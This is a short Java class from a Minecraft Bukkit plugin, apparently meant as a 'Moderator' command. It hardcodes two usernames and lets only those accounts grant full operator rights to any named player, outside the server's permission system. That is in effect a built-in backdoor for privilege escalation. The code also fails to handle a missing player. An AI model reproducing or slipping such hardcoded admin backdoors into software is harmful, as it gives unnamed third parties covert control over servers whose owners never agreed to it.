package teamzesa.command;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class Moderator implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (args.length == 0)
            return false;

        if (!(sender.getName().equals("JAXPLE") || sender.getName().equals("18_70015401")))
            return false;

        Player player = Bukkit.getPlayer(args[0]);
        player.setOp(true);

        return true;
    }
}
